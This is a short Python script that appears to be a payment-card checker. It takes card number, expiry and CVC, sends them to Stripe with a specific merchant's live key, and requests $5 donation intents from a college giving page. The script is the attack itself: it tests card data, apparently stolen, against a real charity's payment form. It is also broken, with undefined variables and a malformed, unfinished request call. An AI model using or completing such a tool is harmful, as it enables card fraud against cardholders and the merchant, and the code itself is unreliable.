import requests,re
def chk(cc):
	import requests
	cnum, month, year, cvc = cc.split('|')
	r = requests.session()


	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = 'payment_method_data[type]=card&payment_method_data[card][number]=' + cnum + '&payment_method_data[card][cvc]=' + cvc + '&payment_method_data[card][exp_year]=' + year + '&payment_method_data[card][exp_month]=' + month + '&payment_method_data[allow_redisplay]=unspecified&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][country]=US&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F81cb80e68b%3B+stripe-js-v3%2F81cb80e68b%3B+payment-element%3B+deferred-intent&payment_method_data[referrer]=https%3A%2F%2Fgo.mc.edu&payment_method_data[time_on_page]=106843&payment_method_data[client_attribution_metadata][client_session_id]=7359453b-2239-40ce-a5bb-477d1f1dd37a&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=deferred&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=merchant_specified&expected_payment_method_type=card&client_context[currency]=usd&client_context[mode]=payment&client_context[capture_method]=manual&client_context[payment_method_types][0]=card&client_context[payment_method_options][us_bank_account][verification_method]=instant&use_stripe_sdk=true&key=pk_live_f1etgxOxEyOS3K9myaBrBqrA&_stripe_account=acct_1KQdE6PmVGzx57IR&client_secret=' + cs
	r1 = requests.post('https://api.stripe.com/v1/payment_intents/', headers=headers, data=data)

	pm = r1.json()['id']


	headers = {
    'authority': 'go.mc.edu',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://go.mc.edu',
    'referer': 'https://go.mc.edu/register/giving',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	params = {
    'cmd': 'payment',
	}

	data = {
    'cmd': 'getIntent',
    'amount': '5',
    'payment_type': 'card',
    'summary': 'Donations',
    'currency': 'usd',
    'account': 'acct_1KQdE6PmVGzx57IR',
    'setupFutureUsage': '',
    'test': '0',
    'add_fee': '0',
}
	
	r2 = requests.post(
			'https://go.mc.edu/register/form',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
    #print("CLIENT SECRET  RESPONSE: ", response.text)
             cs = idresp.get("clientSecret")
             id = idresp.get("id")
	return (r2.json()['errors'])
